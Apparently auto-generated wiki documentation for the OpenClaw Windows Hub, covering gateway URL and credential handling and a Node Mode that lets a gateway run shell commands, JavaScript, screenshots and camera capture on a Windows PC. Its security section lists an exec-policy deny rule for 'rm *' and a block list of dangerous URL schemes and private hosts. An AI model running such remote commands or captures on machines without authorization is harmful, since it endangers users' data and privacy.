1. **Scheme Flexibility**: Users can provide URLs with `http://`, `https://`, `ws://`, or `wss://` schemes, which are normalized to WebSocket schemes
2. **Credential Embedding**: URLs may contain embedded credentials in the form `username:password@host` for authentication
3. **Sanitization**: Credentials must be stripped from URLs before logging or display
4. **Validation**: Invalid URLs must be detected and rejected before connection attempts

All functionality is centralized in the static `GatewayUrlHelper` class in the `OpenClaw.Shared` project.

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:1-160]()

## Core Components

```mermaid
graph TB
    subgraph "GatewayUrlHelper Static Methods"
        IsValid["IsValidGatewayUrl(url)<br/>bool validation"]
        Normalize["TryNormalizeWebSocketUrl(url, out normalized)<br/>Scheme conversion + credential removal"]
        NormalizeWS["NormalizeForWebSocket(url)<br/>Non-throwing variant"]
        ExtractCreds["ExtractCredentials(url)<br/>Returns user-info string"]
        DecodeCreds["DecodeCredentials(credentials)<br/>URL-decode user:pass"]
        Sanitize["SanitizeForDisplay(url)<br/>Remove credentials"]
    end
    
    subgraph "URL Processing Pipeline"
        Input["User Input URL<br/>https://user:pass@host.com"]
        ValidCheck{"Valid?"}
        NormalizedURL["Normalized URL<br/>wss://host.com"]
        Credentials["Credentials<br/>user:pass (decoded)"]
        DisplayURL["Display URL<br/>wss://host.com"]
    end
    
    subgraph "Consumers"
        SettingsUI["SettingsViewModel<br/>Settings window validation"]
        GatewayClient["OpenClawGatewayClient<br/>Connection establishment"]
        NodeClient["WindowsNodeClient<br/>Node mode connection"]
        Logger["Logging<br/>Safe URL display"]
    end
    
    Input --> IsValid
    IsValid --> ValidCheck
    ValidCheck -->|Yes| Normalize
    ValidCheck -->|No| Error["Validation error"]
    
    Normalize --> NormalizedURL
    Input --> ExtractCreds
    ExtractCreds --> DecodeCreds
    DecodeCreds --> Credentials
    
    Input --> Sanitize
    Sanitize --> DisplayURL
    
    NormalizedURL --> GatewayClient
    NormalizedURL --> NodeClient
    Credentials --> GatewayClient
    Credentials --> NodeClient
    DisplayURL --> Logger
    IsValid --> SettingsUI
```

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:5-158](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:8-194]()

## URL Scheme Normalization

### Supported Schemes

The system accepts four URL schemes and normalizes them to WebSocket schemes:

| Input Scheme | Output Scheme | Use Case |
|--------------|---------------|----------|
| `ws://` | `ws://` | Already WebSocket, pass through |
| `wss://` | `wss://` | Already secure WebSocket, pass through |
| `http://` | `ws://` | HTTP converted to WebSocket |
| `https://` | `wss://` | HTTPS converted to secure WebSocket |

All other schemes (`ftp://`, `file://`, etc.) are rejected as invalid.

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:88-133](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:10-23]()

### Normalization Algorithm

The `TryNormalizeWebSocketUrl` method performs the following steps:

```mermaid
flowchart TD
    Start["TryNormalizeWebSocketUrl(url, out normalized)"]
    CheckNull{"Null or<br/>whitespace?"}
    Trim["Trim whitespace"]
    Parse{"Parse as<br/>absolute URI?"}
    CheckScheme{"Scheme?"}
    
    WSScheme["ws:// or wss://"]
    HTTPScheme["http:// or https://"]
    OtherScheme["Other scheme"]
    
    UseAsIs["Use URL as-is"]
    ConvertHTTP["Replace http with ws"]
    ConvertHTTPS["Replace https with wss"]
    Fail["Return false,<br/>normalized = empty"]
    
    RemoveCreds["RemoveUserInfo(url)"]
    Success["Return true,<br/>normalized = cleaned URL"]
    
    Start --> CheckNull
    CheckNull -->|Yes| Fail
    CheckNull -->|No| Trim
    Trim --> Parse
    Parse -->|No| Fail
    Parse -->|Yes| CheckScheme
    
    CheckScheme --> WSScheme
    CheckScheme --> HTTPScheme
    CheckScheme --> OtherScheme
    
    WSScheme --> UseAsIs
    HTTPScheme --> ConvertHTTP
    HTTPScheme --> ConvertHTTPS
    OtherScheme --> Fail
    
    UseAsIs --> RemoveCreds
    ConvertHTTP --> RemoveCreds
    ConvertHTTPS --> RemoveCreds
    
    RemoveCreds --> Success
```

The implementation preserves the original URL's case for the host component and any path/query segments. Only the scheme is modified during conversion.

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:88-133](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:48-57]()

### Non-Throwing Variant

The `NormalizeForWebSocket` method provides a convenience wrapper that never throws exceptions:

- If normalization succeeds, returns the normalized URL
- If normalization fails, returns the trimmed original input
- If input is null, returns an empty string

This is used in contexts where partial validation is acceptable, such as during user input.

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:12-15](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:162-186]()

## Credential Handling

### Extraction from URL User-Info

URLs can embed credentials using the standard user-info syntax: `scheme://username:password@host:port/path`

The `ExtractCredentials` method extracts the `username:password` portion (the `UserInfo` property from `System.Uri`):

```mermaid
graph LR
    Input["wss://user:pass@example.com"]
    Parse["Uri.TryCreate()"]
    Extract["uri.UserInfo"]
    Result["user:pass"]
    
    Input --> Parse
    Parse --> Extract
    Extract --> Result
    
    NoAuth["wss://example.com"]
    NoAuthParse["Uri.TryCreate()"]
    NoAuthExtract["uri.UserInfo is empty"]
    Null["null"]
    
    NoAuth --> NoAuthParse
    NoAuthParse --> NoAuthExtract
    NoAuthExtract --> Null
```

The extracted credentials may contain URL-encoded characters (e.g., `user%40domain` for `user@domain`).

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:22-35](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:59-90]()

### URL Decoding

The `DecodeCredentials` method decodes URL-encoded credential strings:

| Encoded Input | Decoded Output | Description |
|---------------|----------------|-------------|
| `user%40domain:p%40ss` | `user@domain:p@ss` | `@` symbol decoded |
| `user%3Aname:p%2Fass` | `user:name:p/ass` | `:` and `/` decoded |
| `user:pa%25ss` | `user:pa%ss` | `%` symbol decoded |
| `username` | `username:` | Username-only, normalized to `username:` |

The normalization to `username:` format is required for HTTP Basic Authentication, which expects credentials in the form `username:password` (even if the password is empty).

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:42-73](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:105-128]()

### Credential Processing Flow

```mermaid
sequenceDiagram
    participant App as Application
    participant Helper as GatewayUrlHelper
    participant Client as OpenClawGatewayClient
    
    Note over App,Client: URL with embedded credentials
    
    App->>Helper: ExtractCredentials(url)
    Helper-->>App: "user%40domain:p%40ss"
    
    App->>Helper: DecodeCredentials(credentials)
    Helper-->>App: "user@domain:p@ss"
    
    App->>Helper: TryNormalizeWebSocketUrl(url, out normalized)
    Helper-->>App: true, "wss://example.com"
    
    Note over App,Client: Credentials removed from normalized URL
    
    App->>Client: Connect(normalizedUrl, decodedCredentials)
    Client->>Client: Build Basic Auth header
```

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:22-73](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:117-128]()

## URL Validation

### Validation Method

The `IsValidGatewayUrl` method provides a simple boolean check:

```csharp
public static bool IsValidGatewayUrl(string? gatewayUrl) =>
    TryNormalizeWebSocketUrl(gatewayUrl, out _);
```

It returns `true` if the URL can be successfully normalized to a WebSocket URL, `false` otherwise.

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:9-10]()

### Validation Examples

| URL | Valid | Reason |
|-----|-------|--------|
| `ws://localhost:18789` | ✓ | Valid WebSocket URL |
| `wss://host.tailnet.ts.net` | ✓ | Valid secure WebSocket URL |
| `http://localhost:18789` | ✓ | Valid, converts to `ws://` |
| `https://host.example.com` | ✓ | Valid, converts to `wss://` |
| `localhost:18789` | ✗ | No scheme |
| `ftp://example.com` | ✗ | Unsupported scheme |
| `file://localhost/c$/temp` | ✗ | Unsupported scheme |
| `""` (empty string) | ✗ | Empty or whitespace |
| `null` | ✗ | Null input |

**Sources:** [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:25-46](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:140-159]()

### Validation Message

The class provides a constant validation message for use in UI:

```csharp
public const string ValidationMessage = 
    "Gateway URL must be a valid URL (ws://, wss://, http://, or https://).";
```

This message is displayed in the settings window when URL validation fails.

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:7](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:188-193]()

## Display Sanitization

### SanitizeForDisplay Method

The `SanitizeForDisplay` method removes credentials from URLs for safe logging and display:

```mermaid
graph TB
    InputURL["Input URL<br/>wss://user:pass@example.com/path"]
    RemoveUserInfo["RemoveUserInfo(url)"]
    OutputURL["Output URL<br/>wss://example.com/path"]
    
    InputURL --> RemoveUserInfo
    RemoveUserInfo --> OutputURL
    
    NoCredsInput["Input URL<br/>wss://example.com"]
    NoCredsRemove["RemoveUserInfo(url)"]
    NoCredsOutput["Output URL<br/>wss://example.com<br/>(unchanged)"]
    
    NoCredsInput --> NoCredsRemove
    NoCredsRemove --> NoCredsOutput
```

### RemoveUserInfo Implementation

The private `RemoveUserInfo` helper method [src/OpenClaw.Shared/GatewayUrlHelper.cs:135-157]() performs credential removal through string manipulation:

1. Locate the `://` scheme separator
2. Find the authority section (between `://` and the first `/`, `?`, or `#`)
3. Search for `@` within the authority section
4. If found, remove everything between `://` and `@` (inclusive)

This approach preserves the URL structure while removing only the user-info component.

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:78-157](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:130-138]()

## Usage Patterns

### In Settings Validation

The settings window uses URL validation to provide immediate feedback:

```mermaid
sequenceDiagram
    participant User
    participant SettingsVM as SettingsViewModel
    participant Helper as GatewayUrlHelper
    
    User->>SettingsVM: Enter URL in textbox
    SettingsVM->>Helper: IsValidGatewayUrl(url)
    
    alt URL is valid
        Helper-->>SettingsVM: true
        SettingsVM->>User: Clear validation error
    else URL is invalid
        Helper-->>SettingsVM: false
        SettingsVM->>SettingsVM: Set ValidationMessage
        SettingsVM->>User: Display validation error
    end
```

**Sources:** Referenced in context diagrams and architectural overview

### In Client Connection

Both `OpenClawGatewayClient` and `WindowsNodeClient` normalize URLs during construction:

```mermaid
graph LR
    UserInput["User Config<br/>https://user:pass@host.com"]
    
    Constructor["Client Constructor"]
    Extract["ExtractCredentials()"]
    Decode["DecodeCredentials()"]
    Normalize["NormalizeForWebSocket()"]
    
    StoredURL["_gatewayUrl<br/>wss://host.com"]
    StoredAuth["_authHeader<br/>Basic dXNlcjpwYXNz"]
    
    UserInput --> Constructor
    Constructor --> Extract
    Extract --> Decode
    Constructor --> Normalize
    Normalize --> StoredURL
    Decode --> StoredAuth
```

The normalized URL (without credentials) is stored for connection, while the decoded credentials are used to construct an HTTP Basic Authentication header.

**Sources:** [tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs:8-37]()

### In Logging

Whenever a URL needs to be logged, it is sanitized first:

```csharp
var safeUrl = GatewayUrlHelper.SanitizeForDisplay(gatewayUrl);
_logger.LogInformation("Connecting to gateway at {Url}", safeUrl);
```

This prevents credentials from appearing in log files.

**Sources:** Implied by [src/OpenClaw.Shared/GatewayUrlHelper.cs:78-86]()

## Test Coverage

The `GatewayUrlHelper` has comprehensive test coverage in `GatewayUrlHelperTests`:

| Test Category | Test Count | Key Scenarios |
|---------------|------------|---------------|
| Scheme Normalization | 6 tests | HTTP→WS, HTTPS→WSS, case preservation |
| Credential Extraction | 13 tests | User:pass, URL-encoded, username-only |
| Credential Decoding | 5 tests | URL decoding, Basic Auth format |
| Sanitization | 3 tests | User-info removal, path preservation |
| Validation | 11 tests | Valid/invalid URLs, edge cases |
| Whitespace Handling | 2 tests | Trimming before/after processing |

All public methods have corresponding test coverage ensuring correct behavior for both valid and invalid inputs.

**Sources:** [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:1-194]()

---

# Page: Node Mode

# Node Mode

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [README.md](README.md)
- [build.ps1](build.ps1)
- [src/OpenClaw.Shared/Capabilities/SystemCapability.cs](src/OpenClaw.Shared/Capabilities/SystemCapability.cs)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)
- [src/OpenClaw.Shared/WindowsNodeClient.cs](src/OpenClaw.Shared/WindowsNodeClient.cs)
- [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs](src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs)
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs](src/OpenClaw.Tray.WinUI/Services/NodeService.cs)
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs)
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs](tests/OpenClaw.Shared.Tests/CapabilityTests.cs)
- [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs](tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs)

</details>



Node Mode transforms the Windows PC into a remotely controllable agent that the OpenClaw AI assistant can interact with. When enabled, the gateway can send commands to the Windows machine to display notifications, execute system commands, control a WebView2 canvas, capture screenshots, and access the camera.

This page introduces Node Mode architecture and configuration. For detailed information about specific capabilities, see [Canvas Capability](#4.4), [Screen & Camera Capabilities](#4.5), and [System Capability](#4.3). For device pairing and authentication details, see [Node Client & Pairing](#4.1).

**Sources:** [README.md:136-235](), [src/OpenClaw.Shared/WindowsNodeClient.cs:1-859]()

---

## Operating Modes

The OpenClaw Windows Hub operates in one of two modes:

| Mode | Description | Connection Type | Capabilities |
|------|-------------|----------------|--------------|
| **Operator Mode** (default) | User monitors and controls the gateway | WebSocket client via `OpenClawGatewayClient` | Status display, quick send, web chat, notifications |
| **Node Mode** (experimental) | Gateway controls the Windows PC | WebSocket node via `WindowsNodeClient` | System commands, canvas display, screen/camera capture |

Node Mode can be enabled or disabled in the Settings window. When enabled, the application connects as both an operator and a node simultaneously.

**Sources:** [README.md:136-139](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:1-489]()

---

## Architecture Overview

```mermaid
graph TB
    subgraph "OpenClaw Gateway"
        GW["Gateway WebSocket Server<br/>ws://localhost:18789"]
    end
    
    subgraph "Windows Application (OpenClaw.Tray.WinUI)"
        Settings["Settings Window<br/>Enable Node Mode"]
        NodeService["NodeService<br/>Manages node connection"]
        WNC["WindowsNodeClient<br/>WebSocket node client"]
        
        subgraph "Device Identity"
            DeviceIdentity["DeviceIdentity<br/>Ed25519 keypair<br/>%LOCALAPPDATA%/device-identity.json"]
        end
        
        subgraph "Capabilities"
            SysCap["SystemCapability<br/>system.notify, system.run<br/>system.which, system.execApprovals.*"]
            CanvasCap["CanvasCapability<br/>canvas.present, canvas.hide<br/>canvas.navigate, canvas.eval<br/>canvas.snapshot, canvas.a2ui.*"]
            ScreenCap["ScreenCapability<br/>screen.capture, screen.list"]
            CameraCap["CameraCapability<br/>camera.snap, camera.list"]
        end
        
        subgraph "Handlers"
            CanvasWindow["CanvasWindow<br/>WebView2 window"]
            ScreenService["ScreenCaptureService"]
            CameraService["CameraCaptureService"]
            CommandRunner["LocalCommandRunner"]
            ExecPolicy["ExecApprovalPolicy<br/>%LOCALAPPDATA%/exec-policy.json"]
        end
    end
    
    Settings -->|"ConnectAsync"| NodeService
    NodeService -->|"Creates"| WNC
    WNC -->|"WebSocket"| GW
    WNC -->|"Loads"| DeviceIdentity
    
    NodeService -->|"RegisterCapability"| SysCap
    NodeService -->|"RegisterCapability"| CanvasCap
    NodeService -->|"RegisterCapability"| ScreenCap
    NodeService -->|"RegisterCapability"| CameraCap
    
    WNC -->|"node.invoke.request"| SysCap
    WNC -->|"node.invoke.request"| CanvasCap
    WNC -->|"node.invoke.request"| ScreenCap
    WNC -->|"node.invoke.request"| CameraCap
    
    SysCap -->|"Uses"| CommandRunner
    SysCap -->|"Checks"| ExecPolicy
    CanvasCap -->|"Controls"| CanvasWindow
    ScreenCap -->|"Uses"| ScreenService
    CameraCap -->|"Uses"| CameraService
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:1-489](), [src/OpenClaw.Shared/WindowsNodeClient.cs:1-859]()

---

## Connection and Pairing Flow

```mermaid
sequenceDiagram
    participant User
    participant Settings as "Settings Window"
    participant NS as "NodeService"
    participant WNC as "WindowsNodeClient"
    participant DI as "DeviceIdentity"
    participant GW as "Gateway"
    participant CLI as "openclaw CLI<br/>(on Mac/gateway)"
    
    User->>Settings: Enable Node Mode + Save
    Settings->>NS: ConnectAsync(gatewayUrl, token)
    NS->>WNC: new WindowsNodeClient(url, token, dataPath)
    WNC->>DI: Initialize()
    
    alt Device identity exists
        DI->>DI: Load keypair + device token<br/>from device-identity.json
    else First run
        DI->>DI: Generate Ed25519 keypair<br/>Store to device-identity.json
    end
    
    NS->>WNC: RegisterCapability(SystemCapability)
    NS->>WNC: RegisterCapability(CanvasCapability)
    NS->>WNC: RegisterCapability(ScreenCapability)
    NS->>WNC: RegisterCapability(CameraCapability)
    NS->>WNC: ConnectAsync()
    
    WNC->>GW: WebSocket connect
    GW->>WNC: event: connect.challenge<br/>{nonce, ts}
    
    WNC->>WNC: Sign payload with Ed25519<br/>payload = nonce + signedAt + clientId + token
    WNC->>GW: req: connect<br/>{device: {id, publicKey, signature, signedAt}}
    
    alt Already paired (has device token)
        GW->>WNC: res: hello-ok<br/>{auth: {deviceToken}}
        WNC->>User: StatusChanged: Connected<br/>PairingStatus: Paired
    else Not yet paired
        GW->>WNC: res: hello-ok<br/>(no deviceToken)
        WNC->>User: StatusChanged: Connected<br/>PairingStatus: Pending
        
        Note over User,CLI: Manual approval required
        User->>CLI: openclaw devices list
        CLI-->>User: Shows pending device
        User->>CLI: openclaw devices approve <device-id>
        CLI->>GW: Approve device
        
        Note over GW,WNC: Next reconnect or command
        GW->>WNC: res: hello-ok<br/>{auth: {deviceToken}}
        WNC->>DI: StoreDeviceToken(token)
        DI->>DI: Save to device-identity.json
        WNC->>User: PairingStatus: Paired
    end
    
    GW->>WNC: event: node.invoke.request<br/>{requestId, command, args}
    WNC->>WNC: Find capability for command
    WNC->>NS: ExecuteAsync(request)
    NS->>WNC: NodeInvokeResponse {ok, payload}
    WNC->>GW: req: node.invoke.result<br/>{id, nodeId, ok, payload}
```

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:122-158](), [src/OpenClaw.Shared/WindowsNodeClient.cs:443-548](), [src/OpenClaw.Shared/WindowsNodeClient.cs:550-643](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:58-81]()

---

## Device Identity and Authentication

Node Mode uses Ed25519 public-key cryptography for device authentication:

### Key Components

| Component | Location | Purpose |
|-----------|----------|---------|
| `DeviceIdentity` | [src/OpenClaw.Shared/DeviceIdentity.cs]() | Manages Ed25519 keypair and device token |
| `device-identity.json` | `%LOCALAPPDATA%\OpenClawTray\` | Stores private key, public key, device ID, device token |
| Device ID | Derived from public key | Persistent identifier (e.g., `d_abc123...`) |

### Authentication Flow

1. **First Connection**: `DeviceIdentity.Initialize()` generates Ed25519 keypair and stores to disk
2. **Challenge**: Gateway sends nonce in `connect.challenge` event
3. **Signature**: Client signs payload: `nonce + signedAt + clientId + operatorToken` using private key
4. **Verification**: Gateway verifies signature using stored public key
5. **Token**: After approval, gateway returns `deviceToken` which replaces operator token for future connections

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:64-85](), [src/OpenClaw.Shared/WindowsNodeClient.cs:468-548]()

---

## Capability System

Commands from the gateway are dispatched to registered capabilities based on command name prefixes:

```mermaid
graph TB
    subgraph "Gateway Command Flow"
        GW["Gateway sends:<br/>node.invoke.request<br/>{requestId, command, args}"]
    end
    
    subgraph "WindowsNodeClient"
        Dispatch["Command Dispatcher<br/>_capabilities.FirstOrDefault(c => c.CanHandle(command))"]
    end
    
    subgraph "Registered Capabilities"
        SysCap["SystemCapability<br/>CanHandle: command.StartsWith('system.')"]
        CanvasCap["CanvasCapability<br/>CanHandle: command.StartsWith('canvas.')"]
        ScreenCap["ScreenCapability<br/>CanHandle: command.StartsWith('screen.')"]
        CameraCap["CameraCapability<br/>CanHandle: command.StartsWith('camera.')"]
    end
    
    subgraph "Execution"
        Execute["INodeCapability.ExecuteAsync(request)<br/>Returns: NodeInvokeResponse {ok, payload, error}"]
    end
    
    subgraph "Response"
        Result["WindowsNodeClient sends:<br/>node.invoke.result<br/>{id, nodeId, ok, payload, error}"]
    end
    
    GW --> Dispatch
    Dispatch --> SysCap
    Dispatch --> CanvasCap
    Dispatch --> ScreenCap
    Dispatch --> CameraCap
    
    SysCap --> Execute
    CanvasCap --> Execute
    ScreenCap --> Execute
    CameraCap --> Execute
    
    Execute --> Result
    Result --> GW
```

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:309-415](), [src/OpenClaw.Shared/WindowsNodeClient.cs:674-744]()

---

## Available Capabilities

### System Capability

| Command | Description | Requires Approval |
|---------|-------------|-------------------|
| `system.notify` | Show Windows toast notification | No |
| `system.run` | Execute shell command with timeout | Yes (via `ExecApprovalPolicy`) |
| `system.which` | Resolve executable paths | No |
| `system.execApprovals.get` | Get execution approval policy | No |
| `system.execApprovals.set` | Update execution approval policy | No |

**Implementation:** [src/OpenClaw.Shared/Capabilities/SystemCapability.cs]()

### Canvas Capability

| Command | Description |
|---------|-------------|
| `canvas.present` | Show WebView2 window with URL or HTML |
| `canvas.hide` | Close WebView2 window |
| `canvas.navigate` | Navigate WebView2 to URL |
| `canvas.eval` | Execute JavaScript in WebView2 |
| `canvas.snapshot` | Capture WebView2 screenshot as base64 |
| `canvas.a2ui.push` | Send Adaptive UI (A2UI) JSONL messages |
| `canvas.a2ui.reset` | Reset Adaptive UI state |

**Implementation:** [src/OpenClaw.Shared/Capabilities/CanvasCapability.cs]()  
**UI Component:** [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs]()

### Screen Capability

| Command | Description |
|---------|-------------|
| `screen.list` | List available monitors with resolution |
| `screen.capture` | Capture screenshot of specified monitor |

**Implementation:** [src/OpenClaw.Shared/Capabilities/ScreenCapability.cs]()  
**Service:** [src/OpenClaw.Tray.WinUI/Services/ScreenCaptureService.cs]()

### Camera Capability

| Command | Description |
|---------|-------------|
| `camera.list` | List available cameras |
| `camera.snap` | Capture photo from camera (with multiple fallback strategies) |

**Implementation:** [src/OpenClaw.Shared/Capabilities/CameraCapability.cs]()  
**Service:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs]()

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:1-900](), [README.md:140-146]()

---

## Security Model

Node Mode implements multiple security layers:

### 1. Gateway-Side Command Allowlist

Commands must be explicitly listed in `~/.openclaw/openclaw.json` under `gateway.nodes.allowCommands`. Wildcards are **not** supported.

```json
{
  "gateway": {
    "nodes": {
      "allowCommands": [
        "system.notify",
        "system.run",
        "canvas.present",
        "screen.capture",
        "camera.snap"
      ]
    }
  }
}
```

**Source:** [README.md:156-182]()

### 2. Local Execution Policy

`system.run` commands are checked against `ExecApprovalPolicy` stored in `%LOCALAPPDATA%\OpenClawTray\exec-policy.json`:

```json
{
  "defaultAction": "deny",
  "rules": [
    {
      "pattern": "echo *",
      "action": "allow",
      "enabled": true
    },
    {
      "pattern": "powershell.exe",
      "action": "allow",
      "shells": ["powershell"],
      "enabled": true
    },
    {
      "pattern": "rm *",
      "action": "deny",
      "enabled": true
    }
  ]
}
```

Rules are evaluated in order; first match wins. Patterns support wildcards (`*`, `?`).

**Sources:** [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:236-273](), [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:1-589](), [README.md:218-224]()

### 3. Canvas URL Validation

`CanvasWindow` blocks dangerous URLs via regex patterns:

- **Blocked schemes:** `file://`, `javascript:`, `data:` (except safe data URLs), `vbscript:`
- **Blocked hosts:** `localhost`, `127.*`, `10.*`, `192.168.*`, `172.16-31.*`, `169.254.*`, IPv6 localhost

**Implementation:** [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:24-63]()

### 4. HTML Sanitization

`CanvasWindow.LoadHtml()` strips dangerous embedded elements (`<iframe>`, `<object>`, `<embed>`, `<applet>`) to prevent URL validation bypass.

**Implementation:** [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:246-257]()

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:1-446]()

---

## Configuration

### Enabling Node Mode

1. Open **Settings** window from tray menu
2. Check **Enable Node Mode**
3. Click **Save**
4. Approve device on gateway: `openclaw devices list` then `openclaw devices approve <device-id>`

### Settings Storage

| Setting | Location | Format |
|---------|----------|--------|
| Node Mode enabled | `%APPDATA%\OpenClawTray\settings.json` | JSON: `"NodeMode": true` |
| Device identity | `%LOCALAPPDATA%\OpenClawTray\device-identity.json` | JSON with Ed25519 keys |
| Execution policy | `%LOCALAPPDATA%\OpenClawTray\exec-policy.json` | JSON with rules array |

**Sources:** [README.md:149-155](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:58-81]()

---

## Node Status in UI

When Node Mode is enabled, the tray menu displays connection status:

| Status | Display | Description |
|--------|---------|-------------|
| **Connecting** | 🔄 Connecting... | Establishing WebSocket connection |
| **Pending Approval** | ⏳ Waiting for approval... | Connected but device not yet approved on gateway |
| **Paired** | ✅ Paired & Connected | Device approved and ready to receive commands |
| **Error** | ❌ Connection error | WebSocket connection failed |

Click the device ID in the menu to copy it for the `openclaw devices approve` command.

**Sources:** [README.md:228-234](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:140-150]()

---

## Camera Capture Fallback Strategy

`CameraCaptureService` implements a three-tier fallback strategy for robust photo capture across different hardware:

```mermaid
graph TD
    Start["camera.snap request"]
    
    Start --> Init["Initialize MediaCapture"]
    Init --> CheckPhoto["Check photo stream properties"]
    
    CheckPhoto -->|"Available"| Photo["Strategy 1:<br/>CapturePhotoToStreamAsync<br/>Preferred: JPEG/PNG encoding"]
    CheckPhoto -->|"Not available"| VideoFallback
    
    Photo -->|"Success"| Encode["Encode to requested format<br/>Resize if maxWidth specified"]
    Photo -->|"MF_E_INVALIDMEDIATYPE"| VideoFallback
    
    VideoFallback["Strategy 2:<br/>MediaFrameReader<br/>Capture from color frame source"]
    VideoFallback -->|"Success"| Encode
    VideoFallback -->|"Fail"| PreviewFallback
    
    PreviewFallback["Strategy 3:<br/>GetPreviewFrameAsync<br/>Start preview, grab frame, stop preview"]
    PreviewFallback --> Encode
    
    Encode --> Return["Return CameraSnapResult<br/>{format, width, height, base64}"]
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:56-128](), [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:214-231](), [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:349-406]()

---

## Example Usage

### From Gateway CLI (Mac/Linux)

```bash
# List devices
openclaw devices list

# Approve device
openclaw devices approve d_abc123...

# Send notification
openclaw nodes notify --node d_abc123... --title "Hello" --body "From gateway"

# Execute command (requires exec policy approval)
openclaw nodes invoke --node d_abc123... --command system.run \
  --params '{"command":"Get-Process | Select -First 5","shell":"powershell","timeoutMs":10000}'

# Display canvas window
openclaw nodes canvas present --node d_abc123... --url "https://example.com"

# Capture screenshot
openclaw nodes invoke --node d_abc123... --command screen.capture \
  --params '{"screenIndex":0,"format":"png"}'

# Take photo
openclaw nodes invoke --node d_abc123... --command camera.snap \
  --params '{"format":"jpeg","quality":80}'
```

**Sources:** [README.md:185-215]()

---

## Thread Safety

All capability handlers that interact with UI components use `DispatcherQueue` to marshal calls to the UI thread:

```csharp
// Example from NodeService
private void OnCanvasPresent(object? sender, CanvasPresentArgs args)
{
    _dispatcherQueue.TryEnqueue(() =>
    {
        // UI operations here
        _canvasWindow = new CanvasWindow();
        _canvasWindow.Navigate(args.Url);
        _canvasWindow.Activate();
    });
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:166-204](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:226-246]()

---

# Page: Node Client & Pairing

# Node Client & Pairing

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/WindowsNodeClient.cs](src/OpenClaw.Shared/WindowsNodeClient.cs)
- [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs](src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs)
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs](src/OpenClaw.Tray.WinUI/Services/NodeService.cs)
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs)

</details>



This document describes the **WindowsNodeClient** and its device pairing mechanism, which enable the Windows PC to act as a remotely controllable agent in Node Mode. For information about the capabilities that the node exposes (system, canvas, screen, camera), see [Capability System](#4.2) and subsequent subsections.

---

## Overview

The `WindowsNodeClient` class ([src/OpenClaw.Shared/WindowsNodeClient.cs:16-859]()) extends the gateway WebSocket connection to operate in "node" mode, transforming the Windows PC from a passive operator interface into an actively controlled agent. This enables remote command execution through a capability-based architecture with Ed25519 cryptographic authentication.

**Key responsibilities:**
- Establish WebSocket connection to gateway with node role
- Generate and manage persistent Ed25519 device identity
- Handle challenge-response authentication and pairing approval workflow
- Register and dispatch commands to capability handlers
- Maintain connection state with automatic reconnection
- Process `node.invoke` requests from gateway

